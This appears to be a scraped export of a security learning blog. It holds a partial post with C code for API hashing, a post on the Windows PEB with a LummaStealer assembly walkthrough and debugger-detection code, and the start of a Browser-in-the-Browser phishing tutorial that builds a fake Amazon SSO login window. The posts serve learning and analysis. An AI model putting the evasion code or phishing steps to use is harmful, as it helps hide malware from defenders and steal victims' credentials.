equal then we found the function we want if (dwApiNameHash == HASHA(pFunctionName)) { return pFunctionAddress; } } return NULL; } HMODULE GetModuleHandleH(DWORD dwModuleNameHash) { #ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); char dllName[256]; snprintf(dllName, sizeof(dllName), \u0026#34;%wZ\u0026#34;, pLdrModule-\u0026gt;BaseDllName); printf(\u0026#34;HASH: 0x%x \\n\u0026#34;, HASHA((PCHAR)dllName)); if ( HASHA(dllName) == dwModuleNameHash) { wprintf(L\u0026#34;Target DLL %wZ found at BaseAddress: %p\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName, pLdrModule-\u0026gt;BaseAddress); return pLdrModule-\u0026gt;BaseAddress; // Exit the program once the target DLL is found } // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } wprintf(L\u0026#34;Target DLL with hash %s not found\\n\u0026#34;, dwModuleNameHash); return 1; } int main(int argc, wchar_t* argv[]) { if (argc != 2) { wprintf(L\u0026#34;Usage: %s \u0026lt;target_dll_name\u0026gt;\\n\u0026#34;, argv[0]); return 1; } // Get the DLL passed as argument, for example user32.dll wchar_t* targetDllName = argv[1]; // Make sure target Dll is loaded before proceeding to enumerate its functions. if (LoadLibraryA((LPCSTR)targetDllName) == NULL) { printf(\u0026#34;Failed to load target dll with error %d. Exiting...\u0026#34;, GetLastError()); return 0; } HMODULE hModule_of_arg_dll = GetModuleHandleH(USER32DLL_HASH); // Getting the address of MessageBoxA function using GetProcAddressH PfnMessageBoxA pMessageBoxA = (PfnMessageBoxA)GetProcAddressH(hModule_of_arg_dll, MessageBoxA_HASH); if (pMessageBoxA == NULL) { printf(\u0026#34;[!] Couldn\u0026#39;t Find Address Of Specified Function \\n\u0026#34;); return -1; } // Calling MessageBoxA pMessageBoxA(NULL, \u0026#34;Avoiding names - executing functions\u0026#34;, \u0026#34;:)\u0026#34;, MB_OK | MB_ICONEXCLAMATION); printf(\u0026#34;[#] Press \u0026lt;Enter\u0026gt; To Quit ... \u0026#34;); getchar(); return 0; } Executing the code outputs the following:\nWhat\u0026rsquo;s next Here we just made 2/3 custom functions:\nGetModuleHandleH GetProcAddressH In the future we will see how to make a custom LoadLibraryH function to apply another API Hashing layer instead of loading the DLL with its plain name.\n","permalink":"http://localhost:1313/posts/apihashing/","summary":"Intro As mentioned in the Exploring PEB struct and its fields post, we will now see how to to use a technique known as API Hashing. API hashing is a technique used in malware to identify API functions by their hash value from their names or other attributes. This hash value can then be used instead of the function names or other attributes to enumerate, rehash, compare and use functions based on the hash value.","title":"API Hashing - Extensive breakdown"},{"content":"Intro This is the first post of the malware series that me and my friend @r4sti will be starting. We basically started learning malware concepts, dev and windows internals, and I will keep track of what we learn - like the rest of the things in this blog:)\nSpecial thanks to him cause he is basically teaching me 70% of this stuff lol.\nSo in this post, we will dive into:\nWhat is PEB Theory compared to a real world sample Code examples IsBeingDebugged Loaded DLLs PEB in depth - x64dbg How it can be abused (dll-unlinking) What is PEB The Process Environment Block (PEB) is a vital structure in the Windows operating system, residing in user-mode memory and accessible by the corresponding process.\nAlthough primarily intended for use by the operating system, the PEB contains a wealth of information about the running process. This includes data on whether the process is being debugged, details on the modules loaded into memory, and the command line used to invoke the process. Due to the critical nature of this information, adversaries have several opportunities to exploit the PEB for malicious purposes.\nThe PEB structure based on microsoft, has the following struct:\ntypedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId; } PEB, *PPEB; but truth is, there is a bigger, undocumented struct of PEB, which contains a lot more information about this Windows structure. Based on the NTAPI undocumented functions, the full structure of PEB is the following:\ntypedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID SubSystemData; PVOID ProcessHeap; PVOID FastPebLock; PPEBLOCKROUTINE FastPebLockRoutine; PPEBLOCKROUTINE FastPebUnlockRoutine; ULONG EnvironmentUpdateCount; PPVOID KernelCallbackTable; PVOID EventLogSection; PVOID EventLog; PPEB_FREE_BLOCK FreeList; ULONG TlsExpansionCounter; PVOID TlsBitmap; ULONG TlsBitmapBits[0x2]; PVOID ReadOnlySharedMemoryBase; PVOID ReadOnlySharedMemoryHeap; PPVOID ReadOnlyStaticServerData; PVOID AnsiCodePageData; PVOID OemCodePageData; PVOID UnicodeCaseTableData; ULONG NumberOfProcessors; ULONG NtGlobalFlag; BYTE Spare2[0x4]; LARGE_INTEGER CriticalSectionTimeout; ULONG HeapSegmentReserve; ULONG HeapSegmentCommit; ULONG HeapDeCommitTotalFreeThreshold; ULONG HeapDeCommitFreeBlockThreshold; ULONG NumberOfHeaps; ULONG MaximumNumberOfHeaps; PPVOID *ProcessHeaps; PVOID GdiSharedHandleTable; PVOID ProcessStarterHelper; PVOID GdiDCAttributeList; PVOID LoaderLock; ULONG OSMajorVersion; ULONG OSMinorVersion; ULONG OSBuildNumber; ULONG OSPlatformId; ULONG ImageSubSystem; ULONG ImageSubSystemMajorVersion; ULONG ImageSubSystemMinorVersion; ULONG GdiHandleBuffer[0x22]; ULONG PostProcessInitRoutine; ULONG TlsExpansionBitmap; BYTE TlsExpansionBitmapBits[0x80]; ULONG SessionId; } PEB, *PPEB; Theory compared to a real world sample What helped us get a better grasp of PEB\u0026rsquo;s fields and how useful this struct can become from a threat actors perspective, is the analysis of LummaStealer.\nI will input below the part of LummaStealer that utilizes PEB and will break it down part by part:\nOn the left we have the original assembly and on the right we have the same part of the code but renamed. We will observe why these parts have been modified as such.\nWe need to start from the main part of the assembly, which is the following:\nLine 1. mov eax, large fs:30h\t; eax = start of PEB structure Line 2. mov eax, [eax+0x0c]\t; eax = Ldr (pointer to PEB_LDR_DATA) Line 3. mov esi, [eax+0x10]\t; esi = pointer to the head of the doubly linked list InLoadOrderModuleList (this is a pointer to the first LDR_MODULE) Line 4. mov esi, [esi]\t; esi = stores the first LDR_MODULE Line 5. cmp dword ptr [esi+0x18], 0\t; esi+0x18 is the BaseAddress field Line 1: In line 1 the malware loads the address of the PEB structure by utilizing the fs:30h segment. It uses the fs segment because the code was written for x32 bit architecture. If it was written for x64 bit architecture, it would use the gs:60h segment.\nLine 2: In line 2 it loads the Ldr field from the PEB structure. We can see that it uses [eax+0x0c] to do so (remember that eax has the fs:30h loaded to it, or in other words the PEB struct). To understand why [eax+0x0c] ( or basically PEB[0x0c] ) is landing on the Ldr field, we must observe what exists on the 0x0c offset of the PEB structure:\ntypedef struct _PEB { BYTE\tReserved1[2];\t// offset = 0x00 --\u0026gt; it stores 2 bytes BYTE BeingDebugged;\t// offset = 0x02 --\u0026gt; it stores 1 byte BYTE Reserved2[1];\t// offset = 0x03 --\u0026gt; it stores 1 byte PVOID Reserved3[2];\t// offset = 0x04 --\u0026gt; it stores 2*4 bytes (PVOID is 4 bytes) PPEB_LDR_DATA Ldr;\t// offset = 0x0c ... Line 3: From the previous code section, we saw that the malware loaded Ldr by using the offset 0x0c. Then, the line mov edi, [eax + 10h] has been renamed to mov edi, [eax + PEB_LDR_DATA.InLoadOrderModuleList.Blink]. Why is that? Well, eax was previously set to Ldr (mov eax, [eax+0x0c]), and we added the offset 10h (mov esi, [eax+0x10]). So let\u0026rsquo;s simply view the PEB_LDR_DATA struct and see what exists in the 0x10 offset:\ntypedef struct _PEB_LDR_DATA { DWORD Length; // offset = 0x00 BYTE Initialized[4]; // offset = 0x04 void* SsHandle; // offset = 0x08 LIST_ENTRY InLoadOrderModuleList; // offset = 0x0c `----\u0026gt; _LIST_ENTRY *Flink; // offset = 0x0c `----\u0026gt; _LIST_ENTRY *Blink; // offset = 0x10 LIST_ENTRY InMemoryOrderModuleList; // offset = 0x14 LIST_ENTRY InInitializationOrderModuleList; // offset = 0x1C void* EntryInProgress; // offset = 0x24 } PEB_LDR_DATA; Note: PPEB_LDR_DATA is basically a Pointer to the PEB_LDR_DATA, that's why the PPEB_LDR_DATA Ldr points to the above struct.\rIn the _PEB_LDR_DATA struct I have added the contents of the LIST_ENTRY struct (it has two subfields).\nWe can see that the offset 0x10 is landing inside the InLoadOrderModuleList and specifically in the Blink field. But what is the InLoadOrderModuleList and its Blink and Flink fields\u0026hellip;??!!??\nWell, the InLoadOrderModuleList is a double linked list where its elements (Flink and Blink) are pointers to some LDR_MODULE (or as it is called today LDR_DATA_TABLE_ENTRY)\nTo put it simply, when an executable runs, the DLL\u0026rsquo;s it uses are stored in the LDR_MODULE struct. This stuct has the following fields:\ntypedef struct _LDR_MODULE { LIST_ENTRY InLoadOrderModuleList; // offset = 0x00 `----\u0026gt; _LIST_ENTRY *Flink; // offset = 0x00 `----\u0026gt; _LIST_ENTRY *Blink; // offset = 0x04 LIST_ENTRY InMemoryOrderModuleList; // offset = 0x08 LIST_ENTRY InInitializationOrderModuleList; // offset = 0x10 PVOID BaseAddress; // offset = 0x18 PVOID EntryPoint; // offset = 0x1c ULONG SizeOfImage; // offset = 0x20 UNICODE_STRING FullDllName; // offset = 0x28 UNICODE_STRING BaseDllName; // offset = 0x30 ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE, *PLDR_MODULE; All the elements of this list can be parsed with the help of InLoadOrderModuleList and specifically the Blink and Flink fields, which just point to the previous (B-ackwards) and next (F-orward) DLL List entry. A picture that perfectly depicts this is the following:\nNOTE: The first element of this list has no data section. It only has two pointers (Flink and Blink):\nThe first element of the list is the far left.\nLine 4: So at this point, the malware just loaded LDR through PEB and the esi register (mov esi, [esi]) contains the Blink of the List Head that points to the last LDR_MODULE. By dereferencing esi ([esi]), esi will basically \u0026ldquo;execute\u0026rdquo; the pointing to the previous LDR_MODULE. Now, we have landed on the previous LDR_MODULE and specifically on the Flink field. Why?\nBy dereferencing esi, we are now refering on the offset 0x00 - the start of where the esi is pointing. But since esi is pointing to the previous LDR_MODULE on offset 0x00, by looking at the LDR_MODULE struct, we see that the offset 0x00 is the InLoadOrderModuleList and specifically the Flink field since it is the first of the InLoadOrderModuleList's subfields (so they have the same offset).\nLine 5: Looking at the LDR_MODULE struct once again, at offset 0x18 we see the BaseAddress field (or DllBase). The check for the BaseAddress is made to make sure no errors have occur and the program won\u0026rsquo;t crash because of perhaps some invalid entry.\nSo, in order to locate the KERNEL32.DLL, the code loops through all modules of the InLoadOrderModuleList with the help of the Flink and Blink pointers. Every time in the loop, it moves to the next module of the list, storing the Flink pointer that points to the next element of the list.\nFor each module, it loads its BaseDllName (push dword ptr [esi+30h]) and it checks if it is the KERNEL32.DLL.\nMoving forward, esi (since it is now a Double linked list) will eventually end up back in the List Head, which is stored in the edi register. That is why in the code the cmp edi, esi is the loop termination condition.\nFinally, after the loop, it takes the base address of the DLL and a hash, where it proceeds to do API hashing.\nCode examples Now that we have reviewed the part of the malware that utilized PEB and we have become familiar with it, let\u0026rsquo;s start writting some code examples in C and play around with PEB.\nCode example 1 - IsBeingDebugged In this chapter we will write a simple script that uses PEB\u0026rsquo;s isBeingDebugged field to try and see if our running executable is loaded into a debugger or not.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; int main(int argc, wchar_t* argv[]) { PPEB pPEB = (PPEB)__readgsqword(0x60); // First way: Point to field with -\u0026gt; BYTE being_debugged = pPEB-\u0026gt;BeingDebugged; printf(\u0026#34;IsBeingDebugged: %d\\n\u0026#34;, being_debugged); // Second way: Point to field with offset DWORD flag = *(PBYTE)((PBYTE)pPEB + 0x02); // we could also use BYTE instead of DWORD printf(\u0026#34;IsBeingDebugged: %d\\n\u0026#34;, flag); return 0; } Here we see two way different ways of getting the IsBeingDebugged field. Let\u0026rsquo;s break them down!\nReading the PEB Starting off, we read the PEB struct by using the __readgsqword(0x60) since the system is a x64 one. We then cast the result to (PPEB) type which is basically a pointer that points to the PEB struct.\nFirst method The first method that I personally find the easiest is by using the \u0026lsquo;-\u0026gt;\u0026rsquo; symbol. This way we basically use a struct and point (-\u0026gt;) to the field within it:\nPPEB pPEB = (PPEB)__readgsqword(0x60); // read PEB BYTE being_debugged = pPEB-\u0026gt;BeingDebugged; // point to the field within the PEB struct printf(\u0026#34;IsBeingDebugged: %d\\n\u0026#34;, being_debugged); // print whether the exe is being debugged Second method The second method is a bit trickier since we have to calculate the offset from the struct based on the data types and the size they fill in memory. After we calculate the correct offset, we just do the correct byte casting and print the result:\nPPEB pPEB = (PPEB)__readgsqword(0x60); // read PEB DWORD flag = *(PBYTE)((PBYTE)pPEB + 0x02); // point to the field within the PEB struct printf(\u0026#34;IsBeingDebugged with offset pointer: %d\\n\u0026#34;, flag); // print whether the exe is being debugged In more details, the pPEB is a pointer to the PEB struct. By casting to (PBYTE)pPEB, we can now treat the address of the PEB struct as a sequence of bytes rather than a specific struct.\nSo, by doing (PBYTE)pPEB + 0x02 we are now pointing to the byte sequence at offset 0x02.\nFinally, we use the outer *(PBYTE) to dereference the previous byte address and access the actual bytes inside the address.\nRunning the code After running the code in visual studio, we see that the returned value is 0 (False), which means that our executable was not being debugged:\nHowever, if we run it again using the Local Windows Debugger in VS code, both our methods return 1 (True), which means our executable successfully recognized it was being debugged:\nWe will later see this in x64dbg were we will dive deeper into other PEB struct fields.\nCode example 2 - Loaded DLLs Although in the previous example we had direct access to the IsBeingDebugged field of the PEB structure, this will not always be the case. Often times, we will not have direct access to all fields of a struct and thus we will have to define it ourselfs in order to get the desired data.\nIn this code example, we will see how to land on the LDR struct that exists inside the PEB struct and get the list of loaded modules that our executable is using. The code that does this is the following:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026#34;Windows.h\u0026#34; #include \u0026#34;winternl.h\u0026#34; typedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; typedef struct _LDR_MODULE_full { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE_full, * PLDR_MODULE_full; int main(int argc, wchar_t* argv[]) { #ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; // Access the InLoadOrderModuleList LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; // Traverse the InLoadOrderModuleList and print the BaseAddress and BaseDllName of each module while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } return 0; } Reading the PEB and its Ldr field Let\u0026rsquo;s break down the code. Starting off, we have the following lines of code:\n#ifdef _WIN64 PPEB pPEB = (PPEB)__readgsqword(0x60); #else PPEB pPEB = (PPEB)__readfsdword(0x30); #endif PPEB_LDR_DATA_full pLdr = pPEB-\u0026gt;Ldr; Basically, our code checks whether the system is a 64 bit system or a 32 bit system in order to know how to read the PEB struct. You can tell from the way it reads it:\n__readgsqword(0x60) \u0026ndash;\u0026gt; gsqword and 0x60 offset \u0026ndash;\u0026gt; 64 bit system __readfsdword(0x30) \u0026ndash;\u0026gt; fsdword and 0x30 offset \u0026ndash;\u0026gt; 32 bit system After the code has recognized the system, it reads the Ldr field of the PEB struct. But wait a minute. Why do we cast the pLdr to a PPEB_LDR_DATA_full? Why didn\u0026rsquo;t we do the same in the IsBeingDebugged example?\nTurns out, some Windows structs are not fully documented and thus there are limitations by frameworks such as VS code as to what fields it identifies. So if we were to use the Microsoft\u0026rsquo;s PEB_LDR_DATA struct we would be able to read very limited fields. The PEB_LDR_DATA that Microsoft docs provide is the following:\ntypedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; While the full (undocumented) LDR struct is the following:\ntypedef struct _PEB_LDR_DATA_full { ULONG Length; BOOLEAN Initialized; HANDLE SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID EntryInProgress; BOOLEAN ShutdownInProgress; HANDLE ShutdownThreadId; } PEB_LDR_DATA_full, * PPEB_LDR_DATA_full; And thus this is the one we are using since we later on in the code try to read the InLoadOrderModuleList. Now this explains the one of the two self defined structs we have written in our code.\nTo summarise before continuing, the code:\nreads the PEB field depending on the system\u0026rsquo;s architecture. defines the full LDR struct and proceeds to read and store it in the pLdr variable, which is a pointer pointing at that struct (and all its fields). Reading Ldr-\u0026gt;InLoadOrderModuleList\u0026rsquo;s fields Continuing on, we have these two lines of code:\n// Access the InLoadOrderModuleList LIST_ENTRY* pListEntry = pLdr-\u0026gt;InLoadOrderModuleList.Flink; LIST_ENTRY* pListHead = \u0026amp;pLdr-\u0026gt;InLoadOrderModuleList; After our previous read of the LDR struct, we now try and read its InLoadOrderModuleList\u0026rsquo;s subfields, the Flink and Blink. Why? Well, as we descriped earlier on, the InLoadOrderModuleList contains a list of modules that our executable loads on runtime. This is a double linked list and we can move to the next or previous module (DLL) by using the Flink (Forward) and Blink (Backward) subfields. So this is the reason we read these fields in these lines. More specifically, we:\nUse the arrow pointing method, which is more easy to use. For the Blink field, we use the \u0026lsquo;\u0026amp;\u0026rsquo; address symbol for the reason described in the LummaStealer analysis section. As a small reminder, the pListEntry points to the first module in the InLoadOrderModuleList while the pListHead (that uses the \u0026lsquo;\u0026amp;\u0026rsquo; address symbol) points to the head of the list which does not contain any DLL\u0026rsquo;s. It is simply the start of the list as shown in previous pictures. If we were to dereference this address (with a \u0026lsquo;*\u0026rsquo;) then the pListHead would actually use the Flink (which at this point just has its address) and would point to the first DLL loaded in the list - which is exactly what the pListEntry points at. So we just keep its address for the loop comparison instead of the actual DLL it points at. Another reason we need to read the ListEntry and the ListHead is for the following loop, in order to know when we will eventually do a circle and land again on the ListHead.\nLooping through all loaded DLL\u0026rsquo;s After we have successfully located the ListEntry and ListHead, we will start to loop through the list and print each DLL and its address:\n// Traverse the InLoadOrderModuleList and print the BaseAddress and BaseDllName of each module while (pListEntry != pListHead) { PLDR_MODULE_full pLdrModule = CONTAINING_RECORD(pListEntry, LDR_MODULE_full, InLoadOrderModuleList); // Print the BaseAddress and BaseDllName printf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); // Move to the next entry pListEntry = pListEntry-\u0026gt;Flink; } We can see at the end of the loop that the ListEntry changes to the next loaded DLL by doing pListEntry-\u0026gt;Flink - basically using Flink to go to the next DLL. The loop runs until the pListEntry matches the pListHead we stored previously. This means we have completed the looping of the list and there are no more DLL\u0026rsquo;s loaded in it.\nLastly, the way we load each DLL is by using the CONTAINING_RECORD macro definition. The full definition of this macro is the following:\n#define CONTAINING_RECORD(address, type, field) ((type *)((PCHAR)(address) - (ULONG_PTR)(\u0026amp;((type *)0)-\u0026gt;field))) address: This is the address of the field within the structure. So by using the pListEntry, we pass the pointed to the address of the loaded DLL at that time. type: This is the type of the parent structure. Here we passed the LDR_MODULE_full since this is the parent structure that contains the InLoadOrderModuleList subfield that we use to load the DLL\u0026rsquo;s. field: This is the subfield we want to use from the parent structure. Here we used the InLoadOrderModuleList since this is the one we utilized to load the DLL\u0026rsquo;s. Basically, pListEntry points to a LIST_ENTRY structure (Flink of the current entry). The macro calculates the address of the LDR_MODULE_full structure by subtracting the offset of the InLoadOrderModuleList field from pListEntry. This gives us a pointer to the LDR_MODULE_full structure containing the LIST_ENTRY. So pListEntry is nothing more than a list element pointing to a DLL - it is not the actual DLL. That\u0026rsquo;s why we use CONTAINING_MACRO, to get the actual full DLL struct and then cast to PLDR_MODULE_full, since that\u0026rsquo;s what is returned to us.\nPrinting the addresses and DLL\u0026rsquo;s Last but not least, the following two lines handle the printing of the DLL\u0026rsquo;s address and name:\nprintf(\u0026#34;BaseAddress: %p\\n\u0026#34;, pLdrModule-\u0026gt;BaseAddress); wprintf(L\u0026#34;BaseDllName: %wZ\\n\u0026#34;, \u0026amp;pLdrModule-\u0026gt;BaseDllName); The first print statement just uses %p to print the base address to which the pointer is pointing at.\nThe second print statement is a bit more complex. Let\u0026rsquo;s break it down:\nwprintf: This print statement is used for wide-character strings (wchar_t). So the preceding w stands for wide. L\u0026quot;BaseDllName: %wZ\\n\u0026quot;: The L prefix tells the compiler that the string that is about to be print should be treated as a wide-character string (wchar_t). The %wZ when used with wprintf tells the function to format the string as a wide-character string. It is basically a placeholder for wchar_t type strings (wide-character strings). After running the full code we broke down, we will get the following results:\nBaseAddress: 00007FF76D220000\rBaseDllName: isBeingDebugged.exe\rBaseAddress: 00007FF9AB6B0000\rBaseDllName: ntdll.dll\rBaseAddress: 00007FF9A97A0000\rBaseDllName: KERNEL32.DLL\rBaseAddress: 00007FF9A8ED0000\rBaseDllName: KERNELBASE.dll\rBaseAddress: 00007FF998190000\rBaseDllName: VCRUNTIME140D.dll\rBaseAddress: 00007FF9850A0000\rBaseDllName: ucrtbased.dll In the following section, we will see the same executable in x64dbg and see in action how all these fields show up in a debugger and how to identify them:)\nPEB in depth - x64dbg Now that we have a fully working executable that enumerates the InLoadModuleList to get the DLLs, let\u0026rsquo;s load it in x64dbg and see the relevant fields while debugging the exe.\nWe first need to uncheck the System Breakpoint by going to Options-\u0026gt;References:\nThe reason is that the x64dbg would land on the ntdll if we had a system breakpoint checked. For more information regarding this, advise this video from OALABS.\nAfter that, when we load the executable the debugging will start on the target. We then need to locate the invoke main instruction:\nGoing through the instructions, eventually we will find the PEB struct (gs:60h):\nTo go into the full struct, we need to either follow the address loaded to rax (since the PEB is moved to the rax register) or just use CTRL+G and write \u0026ldquo;peb()\u0026rdquo;. Both these are equal and will give/land us to the base address of the PEB:\nPEB BaseAddress After we have landed on the base address of the PEB struct, we need to follow this address in the memory dump. We can do this by write clicking\u0026ndash;\u0026gt;Follow in Dump\u0026ndash;\u0026gt;Selected Address. This will lead us to the PEB address, and in the following image we can see some of the most important fields of PEB:\nAs a reference, here is the relevant fields in the PEB struct:\ntypedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; -- more -- } The underlined addresses are of Pointer type. Pointers can also not be underlined if they point to a null reference.\nImageBaseAddress To land for example in the ImageBaseAddress field - the green address - we just need to highlight the corresponding address (0x00007FF710330000 (big endian)), right click on it and chose Follow QWORD Map-\u0026gt;Dump 2. This will show the MZ header which means it has landed on the exe itself:\nLdr To land on the Ldr struct, we need to follow the second pointer highlighted in blue with address 0x00007FF9AB81C4. As previously, follow the QWORD in Dump 3. You should see something like the following:\nOffset\rAddress\rField\rSubfield\rValue\r0x00\r0x7FF9AB81C4D0\rInLoadOrderModuleList\rFlink\r0x000001DEC5D82D40\r0x08\rBlink\r0x000001DEC5D8DE30\r0x10\r0x7FF9AB81C4E0\rInMemoryOrderModuleList\rFlink\r0x000001DEC5D82D50\r0x18\rBlink\r0x000001DEC5D8DE40\r0x20\r0x7FF9AB81C4EF\rInInitializationOrderModuleList\rFlink\r0x000001DEC5D828D0\r0x28\rBlink\r0x000001DEC5D8DC00\rWe will only analyze the InLoadOrderModuleList since the rest of the lists follow the same logic. Also, the List Head is contained in these lists.\nFlink and Blink Pointers of the List Head Let\u0026rsquo;s follow the Flink Pointer of InLoaderModuleList in the address 0x000001DEC5D82D40 (see the previous table):\nThe InLoadMemoryOrderLinks, InMemoryOrderLinks, InInitializationOrderLinks are of type LIST_ENTRY and they contain just two pointers, a Flink that points to the next element of the list, and a Blink pointing to the previous element of the list.\nIf we take the address of DllBase (0x00003310F77F0000) in Memory Map of x64dbg, we see that the current element of the LDR_MODULE struct (since we previously followed the flink pointer of InLoadOderModuleList) is actually our executable:\nThe 8 bytes that follow are the entry point of the exe.\nIf we follow the same process and follow the Flink Pointer of the current module (our exe), it will lead to the next element (module) of the list, which if we follow as previously the DllBase, we will see its the ntdll.\nIn the same memory map we see these modules, we can actually see the order they have been loaded:\nIn an image @r4sti painted, we can see the logic behind these Flinks we followed:\nThe same idea is applied for the Blink pointer. This would result in us landing in the previous ldr module, where - if you can guess based on the previous image - will be the ucrtbased.dll:\nWhat\u0026rsquo;s next After we got a grasp of the structures and how to enumerate modules, me and r4sti thought API Hashing would be a good next topic to study. So in the next post I\u0026rsquo;ll share what we learned about how to avoid using direct API DLL names and solely use them by their hash.\n","permalink":"http://localhost:1313/posts/peb/","summary":"Intro This is the first post of the malware series that me and my friend @r4sti will be starting. We basically started learning malware concepts, dev and windows internals, and I will keep track of what we learn - like the rest of the things in this blog:)\nSpecial thanks to him cause he is basically teaching me 70% of this stuff lol.\nSo in this post, we will dive into:","title":"Exploring PEB struct and its fields"},{"content":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\nHow does it work The way this attack works is that you host a phishing website, provide a login/signup page with usual platforms like \u0026ldquo;Continue with email\u0026rdquo;, \u0026ldquo;Continue with Facebook\u0026rdquo; etc and make the SSO window look legitimate (valid url) but the reality is that we will have control over that window to, because that window is fake as well.\nDemo To start off, we need to go to mr.d0x github page and get the template windows for this attack:\nhttps://github.com/mrd0x/BITB The files are just usual website files (html, css, js, icons). Example of a window before we modify it is the following: In the github repo, there are multiple templates based on the browser and the theme (dark / light). You need to know how the victim has configured his/her browser in order to use the right template so evade suspicions. You can either take a guess based on statistics (what is the most used theme) or write further code in the website to detect the theme and thus use the appropriate theme:\nhttps://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers Now that we have chosen a theme, let\u0026rsquo;s host a phishing website. I will go with blackeye one since I have made a post about it.\nWe first fire up our phishing website. It\u0026rsquo;s going to be an amazon one:\nAfterwards, we need to find the appropriate amazon.svg file and place it in the theme folder we are using. The final html page should be something like the following:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;window\u0026#34;\u0026gt; \u0026lt;!-- Title bar start --\u0026gt; \u0026lt;div id=\u0026#34;title-bar-width\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;title-bar\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;margin-top:5px;\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./amazon.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;15px\u0026#34; id=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span 